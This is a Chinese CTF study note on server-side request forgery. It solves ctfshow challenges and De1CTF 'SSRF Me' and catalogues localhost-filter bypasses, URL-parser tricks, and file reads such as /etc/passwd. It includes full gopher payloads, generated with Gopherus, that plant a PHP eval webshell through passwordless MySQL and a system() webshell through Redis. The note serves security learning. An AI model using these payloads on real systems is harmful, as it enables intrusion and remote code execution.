### SSRF

鉴于SSTI的经验，感觉将题和内容整理到一篇文章好一点

### 介绍

SSRF是由一种攻击者构造请求，由服务器端发起请求的安全漏洞。一般情况下SSRF的攻击目标是外网无法访问到的内部系统。(正因为请求是由服务器发起的，所以服务器端能请求到与自身相连而与外网隔离的内部系统）

### 原理

SSRF的形成就是服务端提供相应接口来访问服务器内数据，但没做好过滤
类似：`www.baidu.com/?url=127.0.0.1`
他提供了一个访问接口，如果没过滤，我就可以用这接口来访问内网服务(直接访问127.0.0.1当然不可能)，相当于借服务器之手来访问内网

### 攻击手段

介绍只有上面那么多，但是攻击手段不像别的知识点那样有一定的套路，千奇百怪的思路只有见过才知道，所以这部分内容在做题过程中不断补充

> 1.让服务端去访问相应的网址
>
> 2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms
>
> 3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
>
> 4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）
>
> 5.攻击内网应用程序（利用跨协议通信技术）
>
> 6.判断内网主机是否存活：方法是访问看是否有端口开放
>
> 7.DoS攻击（请求大文件，始终保持连接keep-alive always）

大致利用方式及例题不断补充

### 参考链接

没思路了就去各类大神博客里面看看吧

[SSRF 学习记录](https://hackmd.io/@Lhaihai/H1B8PJ9hX#)

### ctfshow

#### web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

直接**curl_init**访问了POST传的url，并打印了回显，没有任何过滤

然后先直接访问`/flag.php`，回显**非本地用户禁止访问**，很明显要内网才能访问

**curl_init**内是可以用**file**协议的，直接

```php
POST
url=file:///var/www/html/flag.php
```

看源码就可得到flag

#### web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

与上题差不多，只不过多了过滤

先看看parse_url

> **parse_url**
>
> 本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 
>
> ```php
> <?php
> $url = 'http://username:password@hostname/path?arg=value#anchor';
> 
> print_r(parse_url($url));
> 
> echo parse_url($url, PHP_URL_PATH);
> ?> 
> Array
> (
>     [scheme] => http
>     [host] => hostname
>     [user] => username
>     [pass] => password
>     [path] => /path
>     [query] => arg=value
>     [fragment] => anchor
> )
> /path
> 
> ```

开头必须是**http**或**https**，且不能包含**localhost和127.0.0**

盲猜flag在`http://127.0.0.1/flag.php`

ip地址可以用[ip进制转换](https://tool.520101.com/wangluo/jinzhizhuanhuan/)变一下样子，完完全全会自动解析

![image-20220913195802017](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\image-20220913195802017.png)

所以

```PHP
POST
url=http://2130706433/flag.php
```

而且我寻思正则匹配也没匹配东西啊。。。直接**localhost**也能过

但是下面这种方法就有点不解了

```php
url=http://0/flag.php
url=http://0.0.0.0/flag.php
#下面两种就是进制绕过，上面本地测试不行，但是题目确实可以打通。。
url=http://0x7f.0.0.1/flag.php
url=http://0177.0.0.1/flag.php
```

#### web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

与上题一样

```php
POST
url=http://2130706433/flag.php
url=http://0/flag.php
url=http://0.0.0.0/flag.php
url=http://0x7f.0.0.1/flag.php
url=http://0177.0.0.1/flag.php
```

#### web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

直接把0和1都过滤了，上面的办法都行不通了

现在的思路就是，找一个域名指向的是`127.0.0.1`

有下面几种思路

DNS-Rebinding攻击绕过

```php
url=http://r.xxxzc8.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r
```

302跳转绕过也行，在自己的网站主页加上这个

```php
<?php
header("Location:http://127.0.0.1/flag.php");
```

或者说有点丧心病狂的方式

```php
将自己的域名A记录设为了127.0.0.1
```

或者有个现成的A记录是127.0.0.1的网站

```php
url=http://sudo.cc/flag.php
```

#### web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

多了host小于5，但对域名没限制，直接

```php
url=http://0/flag.php
url=http://127.1/flag.php //这个为什么也可以捏？
```

#### web356

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

限制更猛了，要小于三

```php
url=http://0/flag.php
```

这个还是可以

#### web357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?>
```

终于来了点不一样的，漏洞入口变成**file_get_contents**了

```php
FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
```

这里是php的过滤器

> 过滤器
>
> 变量类型
>
> | 常量名        | 值（PHP7.2.4） | 说明        |
> | ------------- | -------------- | ----------- |
> | INPUT_POST    | 0              | POST变量    |
> | INPUT_GET     | 1              | GET变量     |
> | INPUT_COOKIE  | 2              | COOKIE变量  |
> | INPUT_ENV     | 4              | ENV变量     |
> | INPUT_SERVER  | 5              | SERVER变量  |
> | INPUT_SESSION | 6              | SESSION变量 |
> | INPUT_REQUEST | 99             | REQUEST变量 |
>
> 过滤器标记
>
> | 常量名                        | 值（PHP7.2.4） | 说明                                                         |
> | ----------------------------- | -------------- | ------------------------------------------------------------ |
> | FILTER_FLAG_NONE              |                | 表示没有使用标记                                             |
> | FILTER_FLAG_ALLOW_OCTAL       |                |                                                              |
> | FILTER_FLAG_ALLOW_HEX         | 2              | 允许十六进制的字符（0x[0-9a-fA-F]+）。                       |
> | FILTER_NULL_ON_FAILURE        | 134217728      | 过滤失败时返回null，而不是false。                            |
> | FILTER_FLAG_ALLOW_THOUSAND    | 8192           | 允许使用千分位分隔符（，）。                                 |
> | FILTER_FLAG_SCHEME_REQUIRED   | 65536          | url需要带协议部分（PHP5.2.1FILTER_VALIDATE_URL隐式使用）。   |
> | FILTER_FLAG_HOST_REQUIRED     | 131072         | url需要带ip地址或域名部分（PHP5.2.1FILTER_VALIDATE_URL隐式使用）。 |
> | FILTER_FLAG_PATH_REQUIRED     | 262144         | url需要带路径部分。                                          |
> | FILTER_FLAG_QUERY_REQUIRED    | 524288         | url需要带数据部分。                                          |
> | FILTER_FLAG_EMAIL_UNICODE     | 1048576        | PHP7.1起，在邮件地址用户名部分允许 Unicode 字符。            |
> | FILTER_FLAG_IPV4              | 1048576        | 仅允许IPv4地址。                                             |
> | FILTER_FLAG_IPV6              | 2097152        | 仅允许IPv6地址。                                             |
> | FILTER_FLAG_NO_PRIV_RANGE     | 8388608        | ip地址不在私有[地址范围](https://blog.csdn.net/asty9000/article/details/83270215)内。 |
> | FILTER_FLAG_NO_RES_RANGE      | 4194304        | ip地址不在保留地址范围内（PHP5.2.10起，支持IPv6地址）。      |
> | FILTER_FLAG_HOSTNAME          | 1048576        | PHP7.0起，验证主机名（必须以字母数字字符开头，并且只包含字母数字或连字符）。 |
> | FILTER_FLAG_NO_ENCODE_QUOTES  | 128            | 不对'和"进行编码。                                           |
> | FILTER_FLAG_STRIP_LOW         | 4              | 去掉ASCII编码值小于32的字符。                                |
> | FILTER_FLAG_STRIP_HIGH        | 8              | 去掉ASCII编码值大于127的字符。                               |
> | FILTER_FLAG_STRIP_BACKTICK    | 512            | PHP5.3.2起，去掉反引号（`）。                                |
> | FILTER_FLAG_ENCODE_LOW        | 16             | 对ASCII编码值小于32的字符进行编码。                          |
> | FILTER_FLAG_ENCODE_HIGH       | 32             | 对ASCII编码值大于127的字符进行编码。                         |
> | FILTER_FLAG_ENCODE_AMP        | 64             | 对&进行编码。                                                |
> | FILTER_FLAG_ALLOW_FRACTION    | 4096           | 保留小数点（.）。                                            |
> | FILTER_FLAG_ALLOW_THOUSAND    | 8192           | 保留千位符（,）。                                            |
> | FILTER_FLAG_ALLOW_SCIENTIFIC  | 16384          | 保留科学计数符（e或E）。                                     |
> | FILTER_REQUIRE_SCALAR         | 33554432       | 需要值为标量。                                               |
> | FILTER_REQUIRE_ARRAY          | 16777216       | 需要值为数组。                                               |
> | FILTER_FORCE_ARRAY            | 67108864       | 如果值为标量，则将其作为数组处理，标量值作为数组元素。       |
> | FILTER_FLAG_EMPTY_STRING_NULL | 256            | PHP5.4起，如果是空字符串，则返回null。                       |
>
> **验证过滤器**
>
> | 常量名                  | 值（PHP7.2.4） | 说明                        |
> | ----------------------- | -------------- | --------------------------- |
> | FILTER_VALIDATE_INT     | 257            | 整型验证过滤器              |
> | FILTER_VALIDATE_BOOLEAN | 258            | 布尔验证过滤器              |
> | FILTER_VALIDATE_FLOAT   | 259            | 浮点验证过滤器              |
> | FILTER_VALIDATE_REGEXP  | 272            | 正则验证过滤器              |
> | FILTER_VALIDATE_URL     | 273            | URL地址验证过滤器           |
> | FILTER_VALIDATE_EMAIL   | 274            | 邮件地址验证过滤器          |
> | FILTER_VALIDATE_IP      | 275            | IP地址验证过滤器            |
> | FILTER_VALIDATE_MAC     | 276            | PHP5.5起，MAC地址验证过滤器 |
> | FILTER_VALIDATE_DOMAIN  | 277            | 域名验证过滤器              |
>
> **字符串过滤器**
>
> | 常量名                             | 值（PHP7.2.4） | 说明                           |
> | ---------------------------------- | -------------- | ------------------------------ |
> | FILTER_SANITIZE_STRING             | 513            | 字符串过滤器                   |
> | FILTER_SANITIZE_STRIPPED           | 513            | 字符串过滤器的别名             |
> | FILTER_SANITIZE_ENCODED            | 514            | url编码过滤器                  |
> | FILTER_SANITIZE_SPECIAL_CHARS      | 515            | 特殊字符过滤器                 |
> | FILTER_UNSAFE_RAW                  | 516            | 原值过滤器                     |
> | FILTER_SANITIZE_EMAIL              | 517            | 邮件地址过滤器                 |
> | FILTER_SANITIZE_URL                | 518            | url地址过滤器                  |
> | FILTER_SANITIZE_NUMBER_INT         | 519            | 整型过滤器                     |
> | FILTER_SANITIZE_NUMBER_FLOAT       | 520            | 浮点过滤器                     |
> | FILTER_SANITIZE_MAGIC_QUOTES       | 521            | 转义过滤器                     |
> | FILTER_SANITIZE_FULL_SPECIAL_CHARS | 522            | PHP5.3.3起，全部特殊字符过滤器 |
>
> **其他**
>
> | 常量名          | 值（PHP7.2.4）         | 说明                   |
> | --------------- | ---------------------- | ---------------------- |
> | FILTER_DEFAULT  | 与配置的默认过滤器相同 | 与配置的默认过滤器相同 |
> | FILTER_CALLBACK | 1024                   | 回调过滤器             |

```php
# php filter函数
filter_var()	获取一个变量，并进行过滤
filter_var_array()	获取多个变量，并进行过滤
......
# PHP 过滤器
FILTER_VALIDATE_IP	把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。
```

所以不能用私有的ip了

上面提到的

**DNS-Rebinding攻击绕过**

```php
url=http://r.xxxzc8.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r
```

**302跳转绕过**

```php
<?php
header("Location:http://127.0.0.1/flag.php");
```

**DNS-Rebinding攻击绕过**是对该域名套了一层壳，第一次访问得到的是真实ip，第二次就变成了**127.0.0.1**

![image-20210928152446432](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\fc053d981de7ffd57c75c9d588a89a21.png)

**302跳转绕过**本质上是先访问了一个正常的域名然后再去访问内网，而域名指向的办法本质上还是直接访问

#### web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

要以`http://ctf. 开头 show结尾`

而url中，**@前面的会丢掉，#后面的一般会丢掉(如果没有类似目录那样的定位符)**
同样`?ctf`GET乱传一个值也无大碍

```php
payload
url=http://ctf.@127.0.0.1/flag.php#show
url=http://ctf.@127.0.0.1/flag.php#?show
```

#### web359

终于开始打内网了，我哭死😭😭

进入页面随意登陆后就发现是对**check.php**传了两个值

一个**returl**，一个**u**

**returl**很明显了，结合提示，无密码mysql

就可以利用mysql的写文件来写入一句话木马，写文件的操作就要用到**gopher**协议

直接利用工具**Gopherus**生成payload

```shell
root@xl-pc:/home/xlccccc/Gopherus-master gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: select '<?php eval($_POST[pass]); ?>' INTO OUTFILE '/var/www/html/2.php';

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

说的很清楚了，只能用于mysql没有密码的环境

然后将`_`后面的内容再进行url编码一次，因为**curl**为防止特殊字符会先url解码一次检测是否有特殊字符

```php
payload
returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254a%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2570%2561%2573%2573%255d%2529%253b%2520%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501&u=123
```

#### web360

简介说了打redis

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

那就同样用**Gopherus**来打

```shell
root@xl-pc:/home/xlccccc/Gopherus-master# gopherus --exploit redis


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html):
Give PHP Payload (We have default PHP Shell):

Your gopher link is Ready to get PHP Shell:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.

-----------Made-by-SpyD3r-----------
```

同样再编码一次，然后`shell.php?cmd=cat /flaaag `

**redis**就是类似mysql的具有内网端口的服务，所以一些具有固定内网端口并有一定权限的服务都可这样打

**ctfshow**的题稍偏基础，后面会补充更多有意思的比赛题和方法

#### 一些补充

##### 其他绕过127的方法

如果目标代码限制访问的域名只能为 http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com http://www.evil.com/

http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php 像这样的网址还有 http://nip.io，http://sslip.io

短网址目前基本都需要登录使用，如缩我，https://4m.cn/

各种指向127.0.0.1的地址

```
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```

##### 利用不存在的协议头绕过指定的协议头

file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）

```php
// ssrf.php
<?php
highlight_file(__FILE__);
if(!preg_match('/^https/is',$_GET['url'])){
die("no hack");
}
echo file_get_contents($_GET['url']);
?>

```

上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：

```php
httpsssss://
```

此时file_get_contents()函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：

```php
ssrf.php?url=httpsssss://../../../../../../etc/passwd
```

##### URL解析差异

**1.readfile和parse_user函数解析差异绕过指定端口**

```php
<?php
$url = 'http://'. $_GET[url];
$parsed = parse_url($url);
if( $parsed[port] == 80 ){  // 这里限制了我们传过去的url只能是80端口的
	readfile($url);
} else {
	die('Hacker!');
}
```

上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过

`ssrf.php?url=127.0.0.1:11211:80/flag.txt`

可以成功读取11211端口flag.txt文件，原理如下图

![1610601312_5fffd36035478c41c2c18.png!small?1610601312696](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\a62b4db733f026cd4bc73bd0aa5ad0b8.jpeg)

两个函数解析host也存在差异

![1610601347_5fffd383dfc1a3982425f.png!small?1610601348433](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\cc15c26e93dfaac450eaa31c71c8d40a.jpeg)

利用这种差异的不同，可以绕过题目中parse_url()函数对指定host的限制

**2.利用curl和parse_url的解析差异绕过指定host**

![1610601386_5fffd3aa565a51587d90c.png!small?1610601386867](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\5ae3d7066929544a036bc1726a07e399.jpeg)

##### Gopher协议

前边的题 payload 都是直接用的脚本生成的，很脚本小子，但是却没学到啥

Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口

Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面

Gopher协议格式

```php
URL: gopher://<host>:<port>/<gopher-path>_后接TCP数据流
注意不要忘记后面那个下划线"_"，下划线"_"后面才开始接TCP数据流，如果不加这个"_"，那么服务端收到的消息将不是完整的，该字符可随意写。
```

如果发起POST请求，回车换行需要使用%0d%0a来代替%0a，如果多个参数，参数之间的&也需要进行URL编码
**利用Gopher协议发送HTTP请求**

步骤

```php
在gopher协议中发送HTTP的数据，需要以下三步：

1.抓取或构造HTTP数据包
2.URL编码、将回车换行符%0a替换为%0d%0a
3.发送符合gopher协议格式的请求
```

**注意这几个问题：**

1.问号（?）需要转码为URL编码，也就是%3f
2.回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
3.在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

##### 攻击内网FastCGI

https://www.freebuf.com/articles/web/260806.html

**这篇文章写的超级详细，上边的很多内容也是参考了这篇文章(有空一定看看)**

#### 参考博客

[y4](https://blog.csdn.net/solitudi/article/details/112510010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166306904916782427440744%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166306904916782427440744&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-112510010-null-null.nonecase&utm_term=ssrf&spm=1018.2226.3001.4450)

[OceanSec](https://blog.csdn.net/q20010619/article/details/120536552?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166308267216782427473506%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166308267216782427473506&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120536552-null-null.142^v47^control_1,201^v3^add_ask&utm_term=web351&spm=1018.2226.3001.4187)

### [De1CTF 2019]SSRF Me

#### 字符串拓展绕过

这题挺有意思的，主要就是代码审计，代码逻辑上有点小问题，**类似moectf的支付系统**

```py
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')
```

看下代码，其实就是有个读和写的功能，并且对路径有waf(反正也不是SSRF做的，无所谓)

写的时候，**param**为你想写的内容的文件，然后将该文件写入**result.txt**

读的时候，**param**主要就是来哈希验证的，回显**result.txt**的内容

**hint**已经提示了flag在./flag.txt

所以目前的思路就是，**将flag写入result，然后读result**

现在的问题就是如何绕过签名

密钥你肯定是得不到的

```py
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
```

在这个路由里，你可以构造任意**param**但**action**固定为**scan**的hash值

这时候你会发现**读**与**写**的检测有个问题

首先，比较**if**是用的**in**，然后，两个**if**是平行的，互不干扰，也就是说，你完全可以两个if都执行

所以你可以在得到hash值时传`?param=flag.txtread`这样你就得到了既写又读的**sign**

然后访问`/De1ta?param=flag.txt`，改cookie为

![image-20220914100058553](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\image-20220914100058553.png)

就行了

在给出了hint下，这确实是一个看起来很预期的解，其实这是**非预期**

下面来讲解**下一个非预期😄**

#### 一丢丢的SSRF

其实这个非预期和上个差不多，单独拿出来讲主要是为了了解一下**urlopen**

就多了一点东西，payload

`local_file:///app/flag.txtread`

![image-20220914103014281](D:\Typora\note\CTF\web\ctfshow_vip\SSRF.assets\image-20220914103014281.png)

关于这个**urlopen**引发了一些讨论，貌似是cve，就不深究了



> **2、Python 2.x - 2.7.16 urllib.fopen支持local_file导致LFI(CVE-2019-9948)**
>
> https://bugs.python.org/issue35907
>
> - 当不存在协议的时候，默认使用`file`协议读取
> - 可以使用`local_file:`绕过，例如`local_file:flag.txt`路径就是相对脚本的路径
>   `local_file://`就必须使用绝对路径(协议一般都是这样)
>   PS:`local-file:///proc/self/cwd/flag.txt`也可以读取，因为`/proc/self/cwd/`代表的是当前路径
> - 如果使用 urllib2.urlopen(param) 去包含文件就必须加上`file`，否则会报`ValueError: unknown url type: /path/to/file`的错误

